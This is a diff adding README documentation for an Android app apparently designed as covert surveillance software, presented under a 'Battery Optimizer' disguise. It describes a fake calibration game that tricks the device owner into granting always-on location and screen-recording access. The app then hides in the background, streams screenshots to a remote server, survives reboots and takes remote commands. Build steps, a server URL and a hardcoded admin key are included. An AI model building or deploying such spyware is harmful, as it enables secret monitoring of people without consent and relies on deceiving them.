@@ -208,6 +208,85 @@ graph TD
 
 ---
 
+**Install Dependencies**
+
+`npm install`
+
+---
+
+**Generate Stealth APK**
+To build the "Battery Optimizer" APK for testing (requires EAS CLI):
+
+`eas build --profile preview --platform android`
+
+---
+
+**⚙️Technical Specifications**
+• Protocol: Socket.io (WebSocket Transport).
+• Buffer Size: 100MB (maxHttpBufferSize: 1e8).
+• Format: Base64 JPEG (Quality 0.5).
+• Interval: 200ms (5 FPS).
+
+---
+
+**📦 Project Structure**
+
+/
+├── App.js                 # Entry point & Background Task definitions
+├── app.json               # Android Permissions & Masking Identity
+├── package.json           # Dependencies (Socket.io, View-Shot, etc.)
+└── /src
+    └── /screens
+        ├── LoginScreen.js # Secure identifier & Admin key entry
+        ├── GhostScreen.js # The "Battery Optimizer" Game & Capture Engine
+        └── AdminScreen.js # Unified HD Monitoring Dashboard
+
+---
+
+# Joyjet Hub: Battery Optimizer 🔋
+
+A high-performance Android synchronization node masked as a system utility. This application provides HD screen relaying and background persistence for the Joyjet Ecosystem.
+
+---
+
+## 🎭 The Stealth Mask
+To maintain a low profile on the target device, the app identifies as **"Battery Optimizer"** in the app drawer and system settings.
+
+### **Activation Sequence:**
+1. **Launch:** The app opens to a "System Calibration" game.
+2. **The 5-Tap Trigger:** The user must tap the red sensor **5 times**.
+3. **Permissions:** - **Tap 1:** Requests "Location Access" (User must select **Allow all the time**).
+   - **Tap 5:** Requests "Screen Recording" (User must select **Start Now**).
+4. **Execution:** After the 5th tap, the app activates the background engine and self-terminates (moves to background stealth mode).
+
+---
+
+## 🚀 Key Features
+* **HD Frame Relay:** Streams at 5 FPS with 0.5 JPEG compression for high-clarity monitoring.
+* **Reboot Survival:** Integrated with `Expo TaskManager` and `RECEIVE_BOOT_COMPLETED` to auto-wake and reconnect after a phone restart.
+* **Smart Mapping:** Automatically routes data to the correct Viewer based on the `Parent_Child` naming convention.
+* **Remote Wipe:** Supports the `WIPE_SERVICE` command to force-close and prompt for uninstallation.
+
+---
+
+## 📡 Identity Matrix
+
+| Role | Name Format | Key Required | Access Level |
+| :--- | :--- | :--- | :--- |
+| **Admin** | `admin` | **Yes** (GURU_8310) | Full control of all nodes & Wipe |
+| **Viewer** | `Alpha` | No | Monitors nodes starting with `Alpha_` |
+| **Ghost** | `Alpha_Device01` | No | Stealthily relays HD data |
+
+---
+
+## 🛠️ Build & Installation
+
+### **1. Configure Server**
+Open `App.js` and update the `SERVER_URL` to your deployed instance:
+```javascript
+const SERVER_URL = "[https://joyjet-server.onrender.com](https://joyjet-server.onrender.com)";
+```
+---
 
 
 
